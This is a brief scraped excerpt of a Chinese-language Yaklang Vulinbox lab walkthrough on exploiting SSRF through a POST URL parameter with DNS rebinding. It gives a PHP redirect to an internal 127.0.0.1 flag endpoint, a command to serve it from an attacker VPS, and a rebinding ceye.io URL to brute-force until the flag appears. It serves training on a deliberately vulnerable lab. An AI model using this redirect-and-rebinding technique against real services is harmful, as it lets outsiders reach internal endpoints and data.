# 04.SSRF POST 中 URL 参数 (DNS Rebinding) | Yak Program Language

- 来源: https://www.yaklang.com/Yaklab/vulinbox/SSRF/04unsafe-rebinding
- 抓取时间: 2026-02-06T07:02:11Z
...
- vps 建立 index.php 内容为 <?php header("Location:``http://127.0.0.1:8787/ssrf/flag``"); ?>
- 启用 PHP 内置的 Web 服务器监听除 80 和 8080 的任意端口 php -S 0.0.0.0:7777
- url 填写为 http://r.xxxx.ceye.io:7777 ，爆破数据包至出现 flag
